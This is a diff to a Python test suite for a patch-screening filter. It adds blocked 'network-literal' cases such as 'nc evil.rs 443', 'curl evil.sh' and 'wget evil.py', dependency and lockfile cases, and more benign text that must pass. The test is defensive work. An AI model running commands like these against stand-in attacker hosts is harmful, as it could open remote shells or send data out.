@@ -112,11 +112,14 @@ def hostile_cases() -> list[tuple[str, str, bridge.Case, str]]:
     add("hostname-com", "network-literal", added(base, "ping evil.example.com"), "network-literal")
     add("hostname-internal", "network-literal", added(base, "db.internal:5432"), "network-literal")
     add("localhost", "network-literal", added(base, "curl localhost"), "network-literal")
-    add("quoted-offlist-tld", "network-literal", added(base, 'connect("api.ru")'), "network-literal")
     add("port-offlist-tld", "network-literal", added(base, "host = exfil.xyz:443"), "network-literal")
     add("at-offlist-tld", "network-literal", added(base, "git@evil.top:me/repo"), "network-literal")
     add("verb-offlist-tld", "network-literal", added(base, "curl evil.example.ru"), "network-literal")
     add("netcat-offlist-tld", "network-literal", added(base, "nc evil.xyz 443"), "network-literal")
+    add("netcat-file-tld", "network-literal", added(base, "nc evil.rs 443"), "network-literal")
+    add("at-file-tld", "network-literal", added(base, "git@evil.zip:me/repo"), "network-literal")
+    add("curl-file-tld", "network-literal", added(base, "curl evil.sh"), "network-literal")
+    add("wget-file-tld", "network-literal", added(base, "wget evil.py"), "network-literal")
     add("git-url", "network-literal", added(base, "git://host/repo"), "network-literal")
     add("ipv6", "network-literal", added(base, "2001:4860:4860::8888"), "network-literal")
     add("unsafe", "unsafe", added(base, "unsafe { call(); }"), "unsafe")
@@ -126,6 +129,8 @@ def hostile_cases() -> list[tuple[str, str, bridge.Case, str]]:
     add("proc-macro", "build", added(base, "proc-macro = true", "crates/probe/Cargo.toml"), "build")
     add("dependency-section", "build", added(base, "[dependencies]", "Cargo.toml"), "build")
     add("dependency", "dependencies", added(base, "serde = \"1\"", "Cargo.toml"), "dependencies")
+    add("dependency-case", "dependencies", added(base, "serde = \"1\"", "crates/probe/cargo.toml"), "dependencies")
+    add("lockfile-case", "dependencies", dataclasses.replace(base, changes=[bridge.Change("CARGO.LOCK")]), "dependencies")
 
     def failed_apply(_patch: bytes, _base: str):
         return "error: patch failed: README:1"
@@ -295,7 +300,7 @@ def check_signed_object() -> None:
 
 def check_ordinary_text_is_allowed() -> None:
     base = valid_case()
-    for text in ("let n = x.len();", "self.changes.push(line.path)", "see Cargo.toml and README.md", "mod args.rs;", "// the raw call is unsafe because it aliases", "#![forbid(unsafe_code)]", "self.app.run();", "self.io.flush()", "the infra repository", "cd ~/.yi", 'open("Cargo.toml")', "let id = row.id;", "server: host.ru", "@functools.cache", "curl -O data.backup.zip", "    @pytest.mark.parametrize(\"n\", [1])"):
+    for text in ("let n = x.len();", "self.changes.push(line.path)", "see Cargo.toml and README.md", "mod args.rs;", "// the raw call is unsafe because it aliases", "#![forbid(unsafe_code)]", "self.app.run();", "self.io.flush()", "the infra repository", "cd ~/.yi", 'open("Cargo.toml")', "let id = row.id;", "server: host.ru", "@functools.cache", 'trace::span("console.draw")', '"response.failed"', "set `mcp.enabled` and `config.intake.enabled`", "see bridge.py:884 and args.rs:300", "    @pytest.mark.parametrize(\"n\", [1])"):
         assert bridge.evaluate(added(base, text)) == bridge.ALLOW, text
 
 
